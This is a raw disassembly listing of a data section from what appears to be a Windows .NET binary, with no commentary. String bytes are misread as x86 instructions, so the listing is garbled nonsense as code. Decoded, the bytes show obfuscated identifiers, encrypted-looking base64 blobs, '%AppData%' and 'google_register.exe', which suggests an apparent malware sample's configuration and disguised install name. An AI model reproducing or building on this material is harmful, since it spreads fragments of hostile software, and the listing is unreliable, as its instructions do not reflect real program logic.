  409ed8:	65 6d                	gs insl (%dx),%es:(%edi)
  409eda:	2e 4e                	cs dec %esi
  409edc:	65 74 2e             	gs je  0x409f0d
  409edf:	53                   	push   %ebx
  409ee0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409ee4:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409eeb:	64 
  409eec:	6f                   	outsl  %ds:(%esi),(%dx)
  409eed:	77 73                	ja     0x409f62
  409eef:	49                   	dec    %ecx
  409ef0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409ef3:	74 69                	je     0x409f5e
  409ef5:	74 79                	je     0x409f70
  409ef7:	00 49 73             	add    %cl,0x73(%ecx)
  409efa:	4e                   	dec    %esi
  409efb:	75 6c                	jne    0x409f69
  409efd:	6c                   	insb   (%dx),%es:(%edi)
  409efe:	4f                   	dec    %edi
  409eff:	72 45                	jb     0x409f46
  409f01:	6d                   	insl   (%dx),%es:(%edi)
  409f02:	70 74                	jo     0x409f78
  409f04:	79 00                	jns    0x409f06
  409f06:	46                   	inc    %esi
  409f07:	61                   	popa
  409f08:	76 78                	jbe    0x409f82
  409f0a:	4f                   	dec    %edi
  409f0b:	61                   	popa
  409f0c:	41                   	inc    %ecx
  409f0d:	48                   	dec    %eax
  409f0e:	4a                   	dec    %edx
  409f0f:	45                   	inc    %ebp
  409f10:	7a 00                	jp     0x409f12
  409f12:	62 6c 67 51          	bound  %ebp,0x51(%edi,%eiz,2)
  409f16:	63 4f 66             	arpl   %ecx,0x66(%edi)
  409f19:	41                   	inc    %ecx
  409f1a:	52                   	push   %edx
  409f1b:	41                   	inc    %ecx
  409f1c:	79 67                	jns    0x409f85
  409f1e:	61                   	popa
  409f1f:	64 7a 00             	fs jp  0x409f22
  409f22:	41                   	inc    %ecx
  409f23:	77 79                	ja     0x409f9e
  409f25:	79 48                	jns    0x409f6f
  409f27:	67 64 68 41 56 7a 4e 	addr16 fs push $0x4e7a5641
  409f2e:	6b 7a 00 6c          	imul   $0x6c,0x0(%edx),%edi
  409f32:	42                   	inc    %edx
  409f33:	69 4c 6f 7a 79 6e 54 	imul   $0x4f546e79,0x7a(%edi,%ebp,2),%ecx
  409f3a:	4f 
  409f3b:	50                   	push   %eax
  409f3c:	70 7a                	jo     0x409fb8
  409f3e:	00 00                	add    %al,(%eax)
  409f40:	00 0d 53 00 48 00    	add    %cl,0x480053
  409f46:	41                   	inc    %ecx
  409f47:	00 32                	add    %dh,(%edx)
  409f49:	00 35 00 36 00 00    	add    %dh,0x3600
  409f4f:	81 59 35 00 6f 00 36 	sbbl   $0x36006f00,0x35(%ecx)
  409f56:	00 50 00             	add    %dl,0x0(%eax)
  409f59:	77 00                	ja     0x409f5b
  409f5b:	57                   	push   %edi
  409f5c:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  409f60:	00 59 00             	add    %bl,0x0(%ecx)
  409f63:	55                   	push   %ebp
  409f64:	00 6a 00             	add    %ch,0x0(%edx)
  409f67:	66 00 53 00          	data16 add %dl,0x0(%ebx)
  409f6b:	64 00 2f             	add    %ch,%fs:(%edi)
  409f6e:	00 2f                	add    %ch,(%edi)
  409f70:	00 5a 00             	add    %bl,0x0(%edx)
  409f73:	72 00                	jb     0x409f75
  409f75:	4c                   	dec    %esp
  409f76:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  409f7a:	00 48 00             	add    %cl,0x0(%eax)
  409f7d:	58                   	pop    %eax
  409f7e:	00 65 00             	add    %ah,0x0(%ebp)
  409f81:	79 00                	jns    0x409f83
  409f83:	48                   	dec    %eax
  409f84:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409f88:	00 53 00             	add    %dl,0x0(%ebx)
  409f8b:	41                   	inc    %ecx
  409f8c:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  409f90:	00 37                	add    %dh,(%edi)
  409f92:	00 36                	add    %dh,(%esi)
  409f94:	00 54 00 6a          	add    %dl,0x6a(%eax,%eax,1)
  409f98:	00 30                	add    %dh,(%eax)
  409f9a:	00 61 00             	add    %ah,0x0(%ecx)
  409f9d:	45                   	inc    %ebp
  409f9e:	00 79 00             	add    %bh,0x0(%ecx)
  409fa1:	31 00                	xor    %eax,(%eax)
  409fa3:	30 00                	xor    %al,(%eax)
  409fa5:	2f                   	das
  409fa6:	00 61 00             	add    %ah,0x0(%ecx)
  409fa9:	4b                   	dec    %ebx
  409faa:	00 6f 00             	add    %ch,0x0(%edi)
  409fad:	4e                   	dec    %esi
  409fae:	00 6f 00             	add    %ch,0x0(%edi)
  409fb1:	77 00                	ja     0x409fb3
  409fb3:	7a 00                	jp     0x409fb5
  409fb5:	77 00                	ja     0x409fb7
  409fb7:	74 00                	je     0x409fb9
  409fb9:	59                   	pop    %ecx
  409fba:	00 38                	add    %bh,(%eax)
  409fbc:	00 63 00             	add    %ah,0x0(%ebx)
  409fbf:	38 00                	cmp    %al,(%eax)
  409fc1:	59                   	pop    %ecx
  409fc2:	00 69 00             	add    %ch,0x0(%ecx)
  409fc5:	69 00 75 00 41 00    	imul   $0x410075,(%eax),%eax
  409fcb:	32 00                	xor    (%eax),%al
  409fcd:	47                   	inc    %edi
  409fce:	00 6e 00             	add    %ch,0x0(%esi)
  409fd1:	78 00                	js     0x409fd3
  409fd3:	6d                   	insl   (%dx),%es:(%edi)
  409fd4:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  409fd8:	00 66 00             	add    %ah,0x0(%esi)
  409fdb:	4e                   	dec    %esi
  409fdc:	00 67 00             	add    %ah,0x0(%edi)
  409fdf:	52                   	push   %edx
  409fe0:	00 34 00             	add    %dh,(%eax,%eax,1)
  409fe3:	67 00 4f 00          	add    %cl,0x0(%bx)
  409fe7:	41                   	inc    %ecx
  409fe8:	00 71 00             	add    %dh,0x0(%ecx)
  409feb:	48                   	dec    %eax
  409fec:	00 6f 00             	add    %ch,0x0(%edi)
  409fef:	6a 00                	push   $0x0
  409ff1:	5a                   	pop    %edx
  409ff2:	00 37                	add    %dh,(%edi)
  409ff4:	00 61 00             	add    %ah,0x0(%ecx)
  409ff7:	39 00                	cmp    %eax,(%eax)
  409ff9:	62 00                	bound  %eax,(%eax)
  409ffb:	6e                   	outsb  %ds:(%esi),(%dx)
  409ffc:	00 4f 00             	add    %cl,0x0(%edi)
  409fff:	58                   	pop    %eax
  40a000:	00 67 00             	add    %ah,0x0(%edi)
  40a003:	33 00                	xor    (%eax),%eax
  40a005:	58                   	pop    %eax
  40a006:	00 6b 00             	add    %ch,0x0(%ebx)
  40a009:	6d                   	insl   (%dx),%es:(%edi)
  40a00a:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40a00e:	00 46 00             	add    %al,0x0(%esi)
  40a011:	72 00                	jb     0x40a013
  40a013:	4a                   	dec    %edx
  40a014:	00 46 00             	add    %al,0x0(%esi)
  40a017:	4e                   	dec    %esi
  40a018:	00 39                	add    %bh,(%ecx)
  40a01a:	00 5a 00             	add    %bl,0x0(%edx)
  40a01d:	4f                   	dec    %edi
  40a01e:	00 39                	add    %bh,(%ecx)
  40a020:	00 5a 00             	add    %bl,0x0(%edx)
  40a023:	49                   	dec    %ecx
  40a024:	00 2b                	add    %ch,(%ebx)
  40a026:	00 49 00             	add    %cl,0x0(%ecx)
  40a029:	56                   	push   %esi
  40a02a:	00 4d 00             	add    %cl,0x0(%ebp)
  40a02d:	32 00                	xor    (%eax),%al
  40a02f:	73 00                	jae    0x40a031
  40a031:	76 00                	jbe    0x40a033
  40a033:	6e                   	outsb  %ds:(%esi),(%dx)
  40a034:	00 41 00             	add    %al,0x0(%ecx)
  40a037:	79 00                	jns    0x40a039
  40a039:	4c                   	dec    %esp
  40a03a:	00 30                	add    %dh,(%eax)
  40a03c:	00 50 00             	add    %dl,0x0(%eax)
  40a03f:	2f                   	das
  40a040:	00 61 00             	add    %ah,0x0(%ecx)
  40a043:	39 00                	cmp    %eax,(%eax)
  40a045:	49                   	dec    %ecx
  40a046:	00 2f                	add    %ch,(%edi)
  40a048:	00 51 00             	add    %dl,0x0(%ecx)
  40a04b:	34 00                	xor    $0x0,%al
  40a04d:	30 00                	xor    %al,(%eax)
  40a04f:	66 00 47 00          	data16 add %al,0x0(%edi)
  40a053:	31 00                	xor    %eax,(%eax)
  40a055:	69 00 4e 00 62 00    	imul   $0x62004e,(%eax),%eax
  40a05b:	63 00                	arpl   %eax,(%eax)
  40a05d:	39 00                	cmp    %eax,(%eax)
  40a05f:	69 00 73 00 30 00    	imul   $0x300073,(%eax),%eax
  40a065:	6d                   	insl   (%dx),%es:(%edi)
  40a066:	00 75 00             	add    %dh,0x0(%ebp)
  40a069:	71 00                	jno    0x40a06b
  40a06b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a06c:	00 39                	add    %bh,(%ecx)
  40a06e:	00 30                	add    %dh,(%eax)
  40a070:	00 55 00             	add    %dl,0x0(%ebp)
  40a073:	47                   	inc    %edi
  40a074:	00 61 00             	add    %ah,0x0(%ecx)
  40a077:	6e                   	outsb  %ds:(%esi),(%dx)
  40a078:	00 75 00             	add    %dh,0x0(%ebp)
  40a07b:	78 00                	js     0x40a07d
  40a07d:	4b                   	dec    %ebx
  40a07e:	00 36                	add    %dh,(%esi)
  40a080:	00 75 00             	add    %dh,0x0(%ebp)
  40a083:	56                   	push   %esi
  40a084:	00 33                	add    %dh,(%ebx)
  40a086:	00 78 00             	add    %bh,0x0(%eax)
  40a089:	5a                   	pop    %edx
  40a08a:	00 70 00             	add    %dh,0x0(%eax)
  40a08d:	46                   	inc    %esi
  40a08e:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40a092:	00 4f 00             	add    %cl,0x0(%edi)
  40a095:	35 00 59 00 59       	xor    $0x59005900,%eax
  40a09a:	00 39                	add    %bh,(%ecx)
  40a09c:	00 72 00             	add    %dh,0x0(%edx)
  40a09f:	2f                   	das
  40a0a0:	00 49 00             	add    %cl,0x0(%ecx)
  40a0a3:	66 00 4d 00          	data16 add %cl,0x0(%ebp)
  40a0a7:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  40a0ac:	41                   	inc    %ecx
  40a0ad:	00 61 00             	add    %ah,0x0(%ecx)
  40a0b0:	44                   	inc    %esp
  40a0b1:	00 4e 00             	add    %cl,0x0(%esi)
  40a0b4:	34 00                	xor    $0x0,%al
  40a0b6:	52                   	push   %edx
  40a0b7:	00 6f 00             	add    %ch,0x0(%edi)
  40a0ba:	39 00                	cmp    %eax,(%eax)
  40a0bc:	64 00 32             	add    %dh,%fs:(%edx)
  40a0bf:	00 2b                	add    %ch,(%ebx)
  40a0c1:	00 65 00             	add    %ah,0x0(%ebp)
  40a0c4:	55                   	push   %ebp
  40a0c5:	00 4a 00             	add    %cl,0x0(%edx)
  40a0c8:	59                   	pop    %ecx
  40a0c9:	00 6c 00 4d          	add    %ch,0x4d(%eax,%eax,1)
  40a0cd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a0d0:	68 00 33 00 33       	push   $0x33003300
  40a0d5:	00 36                	add    %dh,(%esi)
  40a0d7:	00 36                	add    %dh,(%esi)
  40a0d9:	00 35 00 49 00 37    	add    %dh,0x37004900
  40a0df:	00 66 00             	add    %ah,0x0(%esi)
  40a0e2:	39 00                	cmp    %eax,(%eax)
  40a0e4:	52                   	push   %edx
  40a0e5:	00 78 00             	add    %bh,0x0(%eax)
  40a0e8:	74 00                	je     0x40a0ea
  40a0ea:	45                   	inc    %ebp
  40a0eb:	00 44 00 67          	add    %al,0x67(%eax,%eax,1)
  40a0ef:	00 43 00             	add    %al,0x0(%ebx)
  40a0f2:	32 00                	xor    (%eax),%al
  40a0f4:	38 00                	cmp    %al,(%eax)
  40a0f6:	68 00 49 00 4f       	push   $0x4f004900
  40a0fb:	00 4a 00             	add    %cl,0x0(%edx)
  40a0fe:	69 00 53 00 64 00    	imul   $0x640053,(%eax),%eax
  40a104:	50                   	push   %eax
  40a105:	00 67 00             	add    %ah,0x0(%edi)
  40a108:	63 00                	arpl   %eax,(%eax)
  40a10a:	61                   	popa
  40a10b:	00 48 00             	add    %cl,0x0(%eax)
  40a10e:	38 00                	cmp    %al,(%eax)
  40a110:	30 00                	xor    %al,(%eax)
  40a112:	6e                   	outsb  %ds:(%esi),(%dx)
  40a113:	00 71 00             	add    %dh,0x0(%ecx)
  40a116:	74 00                	je     0x40a118
  40a118:	2b 00                	sub    (%eax),%eax
  40a11a:	4f                   	dec    %edi
  40a11b:	00 33                	add    %dh,(%ebx)
  40a11d:	00 72 00             	add    %dh,0x0(%edx)
  40a120:	50                   	push   %eax
  40a121:	00 45 00             	add    %al,0x0(%ebp)
  40a124:	37                   	aaa
  40a125:	00 4a 00             	add    %cl,0x0(%edx)
  40a128:	41                   	inc    %ecx
  40a129:	00 78 00             	add    %bh,0x0(%eax)
  40a12c:	30 00                	xor    %al,(%eax)
  40a12e:	46                   	inc    %esi
  40a12f:	00 75 00             	add    %dh,0x0(%ebp)
  40a132:	47                   	inc    %edi
  40a133:	00 36                	add    %dh,(%esi)
  40a135:	00 74 00 64          	add    %dh,0x64(%eax,%eax,1)
  40a139:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40a13d:	00 46 00             	add    %al,0x0(%esi)
  40a140:	53                   	push   %ebx
  40a141:	00 6d 00             	add    %ch,0x0(%ebp)
  40a144:	49                   	dec    %ecx
  40a145:	00 4b 00             	add    %cl,0x0(%ebx)
  40a148:	74 00                	je     0x40a14a
  40a14a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a14b:	00 54 00 5a          	add    %dl,0x5a(%eax,%eax,1)
  40a14f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a152:	2b 00                	sub    (%eax),%eax
  40a154:	38 00                	cmp    %al,(%eax)
  40a156:	51                   	push   %ecx
  40a157:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a15d:	80 b1 35 00 42 00 7a 	xorb   $0x7a,0x420035(%ecx)
  40a164:	00 65 00             	add    %ah,0x0(%ebp)
  40a167:	75 00                	jne    0x40a169
  40a169:	62 00                	bound  %eax,(%eax)
  40a16b:	4e                   	dec    %esi
  40a16c:	00 79 00             	add    %bh,0x0(%ecx)
  40a16f:	46                   	inc    %esi
  40a170:	00 4a 00             	add    %cl,0x0(%edx)
  40a173:	79 00                	jns    0x40a175
  40a175:	51                   	push   %ecx
  40a176:	00 31                	add    %dh,(%ecx)
  40a178:	00 62 00             	add    %ah,0x0(%edx)
  40a17b:	51                   	push   %ecx
  40a17c:	00 50 00             	add    %dl,0x0(%eax)
  40a17f:	69 00 6f 00 52 00    	imul   $0x52006f,(%eax),%eax
  40a185:	6f                   	outsl  %ds:(%esi),(%dx)
  40a186:	00 56 00             	add    %dl,0x0(%esi)
  40a189:	57                   	push   %edi
  40a18a:	00 49 00             	add    %cl,0x0(%ecx)
  40a18d:	4d                   	dec    %ebp
  40a18e:	00 65 00             	add    %ah,0x0(%ebp)
  40a191:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40a195:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40a198:	00 70 00             	add    %dh,0x0(%eax)
  40a19b:	71 00                	jno    0x40a19d
  40a19d:	35 00 31 00 61       	xor    $0x61003100,%eax
  40a1a2:	00 71 00             	add    %dh,0x0(%ecx)
  40a1a5:	71 00                	jno    0x40a1a7
  40a1a7:	6c                   	insb   (%dx),%es:(%edi)
  40a1a8:	00 45 00             	add    %al,0x0(%ebp)
  40a1ab:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40a1ae:	00 54 00 34          	add    %dl,0x34(%eax,%eax,1)
  40a1b2:	00 62 00             	add    %ah,0x0(%edx)
  40a1b5:	45                   	inc    %ebp
  40a1b6:	00 47 00             	add    %al,0x0(%edi)
  40a1b9:	61                   	popa
  40a1ba:	00 6f 00             	add    %ch,0x0(%edi)
  40a1bd:	54                   	push   %esp
  40a1be:	00 77 00             	add    %dh,0x0(%edi)
  40a1c1:	43                   	inc    %ebx
  40a1c2:	00 61 00             	add    %ah,0x0(%ecx)
  40a1c5:	39 00                	cmp    %eax,(%eax)
  40a1c7:	39 00                	cmp    %eax,(%eax)
  40a1c9:	71 00                	jno    0x40a1cb
  40a1cb:	50                   	push   %eax
  40a1cc:	00 36                	add    %dh,(%esi)
  40a1ce:	00 43 00             	add    %al,0x0(%ebx)
  40a1d1:	31 00                	xor    %eax,(%eax)
  40a1d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1d4:	00 6a 00             	add    %ch,0x0(%edx)
  40a1d7:	76 00                	jbe    0x40a1d9
  40a1d9:	73 00                	jae    0x40a1db
  40a1db:	44                   	inc    %esp
  40a1dc:	00 56 00             	add    %dl,0x0(%esi)
  40a1df:	4e                   	dec    %esi
  40a1e0:	00 48 00             	add    %cl,0x0(%eax)
  40a1e3:	78 00                	js     0x40a1e5
  40a1e5:	35 00 35 00 68       	xor    $0x68003500,%eax
  40a1ea:	00 53 00             	add    %dl,0x0(%ebx)
  40a1ed:	30 00                	xor    %al,(%eax)
  40a1ef:	72 00                	jb     0x40a1f1
  40a1f1:	5a                   	pop    %edx
  40a1f2:	00 69 00             	add    %ch,0x0(%ecx)
  40a1f5:	6b 00 54             	imul   $0x54,(%eax),%eax
  40a1f8:	00 45 00             	add    %al,0x0(%ebp)
  40a1fb:	77 00                	ja     0x40a1fd
  40a1fd:	54                   	push   %esp
  40a1fe:	00 69 00             	add    %ch,0x0(%ecx)
  40a201:	41                   	inc    %ecx
  40a202:	00 59 00             	add    %bl,0x0(%ecx)
  40a205:	2f                   	das
  40a206:	00 37                	add    %dh,(%edi)
  40a208:	00 77 00             	add    %dh,0x0(%edi)
  40a20b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a210:	80 b1 4b 00 52 00 70 	xorb   $0x70,0x52004b(%ecx)
  40a217:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a21a:	78 00                	js     0x40a21c
  40a21c:	4b                   	dec    %ebx
  40a21d:	00 4b 00             	add    %cl,0x0(%ebx)
  40a220:	39 00                	cmp    %eax,(%eax)
  40a222:	35 00 74 00 47       	xor    $0x47007400,%eax
  40a227:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40a22b:	00 36                	add    %dh,(%esi)
  40a22d:	00 7a 00             	add    %bh,0x0(%edx)
  40a230:	67 00 77 00          	add    %dh,0x0(%bx)
  40a234:	35 00 67 00 76       	xor    $0x76006700,%eax
  40a239:	00 4f 00             	add    %cl,0x0(%edi)
  40a23c:	68 00 52 00 57       	push   $0x57005200
  40a241:	00 4d 00             	add    %cl,0x0(%ebp)
  40a244:	43                   	inc    %ebx
  40a245:	00 50 00             	add    %dl,0x0(%eax)
  40a248:	51                   	push   %ecx
  40a249:	00 2b                	add    %ch,(%ebx)
  40a24b:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40a24f:	00 71 00             	add    %dh,0x0(%ecx)
  40a252:	42                   	inc    %edx
  40a253:	00 31                	add    %dh,(%ecx)
  40a255:	00 38                	add    %bh,(%eax)
  40a257:	00 53 00             	add    %dl,0x0(%ebx)
  40a25a:	58                   	pop    %eax
  40a25b:	00 56 00             	add    %dl,0x0(%esi)
  40a25e:	71 00                	jno    0x40a260
  40a260:	34 00                	xor    $0x0,%al
  40a262:	54                   	push   %esp
  40a263:	00 6b 00             	add    %ch,0x0(%ebx)
  40a266:	30 00                	xor    %al,(%eax)
  40a268:	4f                   	dec    %edi
  40a269:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a26d:	00 32                	add    %dh,(%edx)
  40a26f:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40a273:	00 48 00             	add    %cl,0x0(%eax)
  40a276:	32 00                	xor    (%eax),%al
  40a278:	74 00                	je     0x40a27a
  40a27a:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a27e:	69 00 39 00 42 00    	imul   $0x420039,(%eax),%eax
  40a284:	75 00                	jne    0x40a286
  40a286:	71 00                	jno    0x40a288
  40a288:	43                   	inc    %ebx
  40a289:	00 32                	add    %dh,(%edx)
  40a28b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a28e:	4e                   	dec    %esi
  40a28f:	00 58 00             	add    %bl,0x0(%eax)
  40a292:	41                   	inc    %ecx
  40a293:	00 51 00             	add    %dl,0x0(%ecx)
  40a296:	41                   	inc    %ecx
  40a297:	00 62 00             	add    %ah,0x0(%edx)
  40a29a:	79 00                	jns    0x40a29c
  40a29c:	75 00                	jne    0x40a29e
  40a29e:	6b 00 58             	imul   $0x58,(%eax),%eax
  40a2a1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2a4:	6a 00                	push   $0x0
  40a2a6:	48                   	dec    %eax
  40a2a7:	00 4e 00             	add    %cl,0x0(%esi)
  40a2aa:	67 00 67 00          	add    %ah,0x0(%bx)
  40a2ae:	53                   	push   %ebx
  40a2af:	00 53 00             	add    %dl,0x0(%ebx)
  40a2b2:	78 00                	js     0x40a2b4
  40a2b4:	54                   	push   %esp
  40a2b5:	00 61 00             	add    %ah,0x0(%ecx)
  40a2b8:	35 00 75 00 41       	xor    $0x41007500,%eax
  40a2bd:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a2c3:	13 25 00 41 00 70    	adc    0x70004100,%esp
  40a2c9:	00 70 00             	add    %dh,0x0(%eax)
  40a2cc:	44                   	inc    %esp
  40a2cd:	00 61 00             	add    %ah,0x0(%ecx)
  40a2d0:	74 00                	je     0x40a2d2
  40a2d2:	61                   	popa
  40a2d3:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2dd:	00 67 00             	add    %ah,0x0(%edi)
  40a2e0:	6c                   	insb   (%dx),%es:(%edi)
  40a2e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e4:	5f                   	pop    %edi
  40a2e5:	00 72 00             	add    %dh,0x0(%edx)
  40a2e8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2ec:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2f6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2fa:	78 00                	js     0x40a2fc
  40a2fc:	65 00 00             	add    %al,%gs:(%eax)
  40a2ff:	59                   	pop    %ecx
  40a300:	59                   	pop    %ecx
  40a301:	00 30                	add    %dh,(%eax)
  40a303:	00 4e 00             	add    %cl,0x0(%esi)
  40a306:	7a 00                	jp     0x40a308
  40a308:	63 00                	arpl   %eax,(%eax)
  40a30a:	6d                   	insl   (%dx),%es:(%edi)
  40a30b:	00 39                	add    %bh,(%ecx)
  40a30d:	00 48 00             	add    %cl,0x0(%eax)
  40a310:	65 00 54 00 46       	add    %dl,%gs:0x46(%eax,%eax,1)
  40a315:	00 50 00             	add    %dl,0x0(%eax)
  40a318:	57                   	push   %edi
  40a319:	00 55 00             	add    %dl,0x0(%ebp)
  40a31c:	74 00                	je     0x40a31e
  40a31e:	6d                   	insl   (%dx),%es:(%edi)
  40a31f:	00 63 00             	add    %ah,0x0(%ebx)
  40a322:	6b 00 70             	imul   $0x70,(%eax),%eax
  40a325:	00 56 00             	add    %dl,0x0(%esi)
  40a328:	4e                   	dec    %esi
  40a329:	00 32                	add    %dh,(%edx)
  40a32b:	00 4a 00             	add    %cl,0x0(%edx)
  40a32e:	70 00                	jo     0x40a330
  40a330:	53                   	push   %ebx
  40a331:	00 31                	add    %dh,(%ecx)
  40a333:	00 68 00             	add    %ch,0x0(%eax)
  40a336:	4f                   	dec    %edi
  40a337:	00 4f 00             	add    %cl,0x0(%edi)
  40a33a:	58                   	pop    %eax
  40a33b:	00 5a 00             	add    %bl,0x0(%edx)
  40a33e:	31 00                	xor    %eax,(%eax)
  40a340:	56                   	push   %esi
  40a341:	00 7a 00             	add    %bh,0x0(%edx)
  40a344:	68 00 4f 00 5a       	push   $0x5a004f00
  40a349:	00 57 00             	add    %dl,0x0(%edi)
  40a34c:	78 00                	js     0x40a34e
  40a34e:	76 00                	jbe    0x40a350
  40a350:	4e                   	dec    %esi
  40a351:	00 55 00             	add    %dl,0x0(%ebp)
  40a354:	49                   	dec    %ecx
  40a355:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a35b:	33 00                	xor    (%eax),%eax
  40a35d:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  40a361:	46                   	inc    %esi
  40a362:	00 46 00             	add    %al,0x0(%esi)
  40a365:	46                   	inc    %esi
  40a366:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a36a:	00 2b                	add    %ch,(%ebx)
  40a36c:	00 38                	add    %bh,(%eax)
  40a36e:	00 62 00             	add    %ah,0x0(%edx)
  40a371:	72 00                	jb     0x40a373
  40a373:	6f                   	outsl  %ds:(%esi),(%dx)
  40a374:	00 72 00             	add    %dh,0x0(%edx)
  40a377:	59                   	pop    %ecx
  40a378:	00 31                	add    %dh,(%ecx)
  40a37a:	00 73 00             	add    %dh,0x0(%ebx)
  40a37d:	37                   	aaa
  40a37e:	00 64 00 58          	add    %ah,0x58(%eax,%eax,1)
  40a382:	00 48 00             	add    %cl,0x0(%eax)
  40a385:	32 00                	xor    (%eax),%al
  40a387:	69 00 53 00 50 00    	imul   $0x500053,(%eax),%eax
  40a38d:	33 00                	xor    (%eax),%eax
  40a38f:	34 00                	xor    $0x0,%al
  40a391:	35 00 63 00 63       	xor    $0x63006300,%eax
  40a396:	00 79 00             	add    %bh,0x0(%ecx)
  40a399:	7a 00                	jp     0x40a39b
  40a39b:	59                   	pop    %ecx
  40a39c:	00 37                	add    %dh,(%edi)
  40a39e:	00 70 00             	add    %dh,0x0(%eax)
  40a3a1:	35 00 7a 00 6a       	xor    $0x6a007a00,%eax
  40a3a6:	00 59 00             	add    %bl,0x0(%ecx)
  40a3a9:	78 00                	js     0x40a3ab
  40a3ab:	58                   	pop    %eax
  40a3ac:	00 71 00             	add    %dh,0x0(%ecx)
  40a3af:	36 00 64 00 58       	add    %ah,%ss:0x58(%eax,%eax,1)
  40a3b4:	00 32                	add    %dh,(%edx)
  40a3b6:	00 6d 00             	add    %ch,0x0(%ebp)
  40a3b9:	4a                   	dec    %edx
  40a3ba:	00 58 00             	add    %bl,0x0(%eax)
  40a3bd:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40a3c1:	2b 00                	sub    (%eax),%eax
  40a3c3:	4b                   	dec    %ebx
  40a3c4:	00 5a 00             	add    %bl,0x0(%edx)
  40a3c7:	46                   	inc    %esi
  40a3c8:	00 4c 00 2f          	add    %cl,0x2f(%eax,%eax,1)
  40a3cc:	00 4c 00 51          	add    %cl,0x51(%eax,%eax,1)
  40a3d0:	00 45 00             	add    %al,0x0(%ebp)
  40a3d3:	68 00 39 00 53       	push   $0x53003900
  40a3d8:	00 68 00             	add    %ch,0x0(%eax)
  40a3db:	61                   	popa
  40a3dc:	00 69 00             	add    %ch,0x0(%ecx)
  40a3df:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40a3e3:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40a3e7:	5a                   	pop    %edx
  40a3e8:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40a3ec:	00 78 00             	add    %bh,0x0(%eax)
  40a3ef:	38 00                	cmp    %al,(%eax)
  40a3f1:	65 00 37             	add    %dh,%gs:(%edi)
  40a3f4:	00 71 00             	add    %dh,0x0(%ecx)
  40a3f7:	57                   	push   %edi
  40a3f8:	00 69 00             	add    %ch,0x0(%ecx)
  40a3fb:	79 00                	jns    0x40a3fd
  40a3fd:	72 00                	jb     0x40a3ff
  40a3ff:	76 00                	jbe    0x40a401
  40a401:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40a405:	67 00 3d             	add    %bh,(%di)
  40a408:	00 3d 00 00 92 59    	add    %bh,0x59920000
  40a40e:	4e                   	dec    %esi
  40a40f:	00 6f 00             	add    %ch,0x0(%edi)
  40a412:	67 00 31             	add    %dh,(%bx,%di)
  40a415:	00 75 00             	add    %dh,0x0(%ebp)
  40a418:	58                   	pop    %eax
  40a419:	00 49 00             	add    %cl,0x0(%ecx)
  40a41c:	76 00                	jbe    0x40a41e
  40a41e:	45                   	inc    %ebp
  40a41f:	00 38                	add    %bh,(%eax)
  40a421:	00 6e 00             	add    %ch,0x0(%esi)
  40a424:	45                   	inc    %ebp
  40a425:	00 4b 00             	add    %cl,0x0(%ebx)
  40a428:	61                   	popa
  40a429:	00 42 00             	add    %al,0x0(%edx)
  40a42c:	73 00                	jae    0x40a42e
  40a42e:	76 00                	jbe    0x40a430
  40a430:	74 00                	je     0x40a432
  40a432:	44                   	inc    %esp
  40a433:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40a437:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  40a43b:	00 65 00             	add    %ah,0x0(%ebp)
  40a43e:	6a 00                	push   $0x0
  40a440:	56                   	push   %esi
  40a441:	00 42 00             	add    %al,0x0(%edx)
  40a444:	55                   	push   %ebp
  40a445:	00 55 00             	add    %dl,0x0(%ebp)
  40a448:	44                   	inc    %esp
  40a449:	00 4f 00             	add    %cl,0x0(%edi)
  40a44c:	4a                   	dec    %edx
  40a44d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a450:	51                   	push   %ecx
  40a451:	00 57 00             	add    %dl,0x0(%edi)
  40a454:	4d                   	dec    %ebp
  40a455:	00 67 00             	add    %ah,0x0(%edi)
